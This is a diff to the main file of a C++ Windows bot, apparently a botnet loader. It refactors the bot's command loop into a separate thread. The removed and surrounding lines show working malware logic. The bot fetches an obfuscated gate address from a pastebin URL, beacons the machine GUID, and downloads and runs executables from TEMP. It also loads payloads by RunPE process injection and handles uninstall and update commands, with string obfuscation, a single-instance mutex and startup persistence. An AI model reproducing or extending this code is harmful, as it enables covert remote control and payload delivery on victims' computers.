@@ -46,14 +46,15 @@ int main(int argc, char* argv[]) {
 #if NDEBUG 
 int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, char*, int nShowCmd) {
 #endif
+
 		Config config;
-	
+		std::thread darkMain;
+
 		//Check if the Bot is Running
 		std::string mutex = OBFUSCATE("Local\\") + config.mutex;
 		CreateMutexA(0, FALSE, mutex.c_str()); // try to create a named mutex
 		if (GetLastError() == ERROR_ALREADY_EXISTS) // did the mutex already exist?
 			return -1; // quit; mutex is released automatically
-
 
 		//Autostart  (with persistence) && Clone
 		if (config.startup == true) {
@@ -61,63 +62,9 @@ int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, char*, int nShowCmd) {
 			if (insatlled == OBFUSCATE("restart")) {
 				return 0;
 			}
-		    //std::thread startupPersistence(Helpers::addstartup);
-			//startupPersistence.join();
-			Helpers::addstartup();
 		}
 
-		//Fetch Gate from raw Site
-		std::string gateFromPatebin = XOR::encryptDecrypt(postRequest(config.pastebinUrl,"","GET"));
-	
-		//Main
-		std::string guid = Helpers::GetMachineGUID();
+		darkMain = std::thread(Client::darkMainThread);
+		darkMain.join();
 
-		std::string finalPost = Client::returnFinalPost();
-
-
-		while (true) {
-			try {
-				std::cout << gateFromPatebin;
-				std::string responseFromGate = postRequest(gateFromPatebin, finalPost,"POST");
-				//std::string responseFromGate2 = postRequest(gateFromPatebin, finalPost,"POST");
-				std::cout << responseFromGate;
-				if (responseFromGate.find(OBFUSCATE("dande")) != std::string::npos) {
-					std::vector<std::string> v = Helpers::explode(";", responseFromGate);
-					std::string random_str = Helpers::RandomString(10);
-					std::string url(v[2]);
-					std::string file((std::string)getenv(OBFUSCATE("TEMP")) + "\\" + random_str + OBFUSCATE(".exe"));
-					Helpers::downloadFile(url, file);
-					std::string started = Helpers::startNewProcess(file);
-					
-					postRequest(gateFromPatebin, "hwid=" + guid + "&taskstatus=" + started + "&taskid=" + v[0], "POST");
-				}else if (responseFromGate.find(OBFUSCATE("runpe")) != std::string::npos) {
-						std::vector<std::string> v = Helpers::explode(";", responseFromGate);
-						std::string url(v[2]);
-						LPVOID FileData = DownloadURLToBuffer(url.c_str());
-						bool runned = NTRX_RUNPE32(FileData);
-						std::string started = OBFUSCATE("failed");
-						if(runned){
-							 started = OBFUSCATE("success");
-						}
-						postRequest(gateFromPatebin, "hwid=" + guid + "&taskstatus=" + started + "&taskid=" + v[0], "POST");
-					}
-				else {
-					if (responseFromGate.find(OBFUSCATE("uninstall")) != std::string::npos) {
-						Helpers::uninstall();
-						return 0;
-					}
-					else if (responseFromGate.find(OBFUSCATE("update")) != std::string::npos) {
-						std::vector<std::string> v = Helpers::explode(";", responseFromGate);
-						Helpers::update(v[2]);
-						return 0;
-					}
-				}
-			}
-			catch (const std::exception & e) {
-				std::cerr << OBFUSCATE("Request failed, error: ") << e.what() << std::endl;
-			}
-			
-			Sleep(10000);
-		}
-		
 }
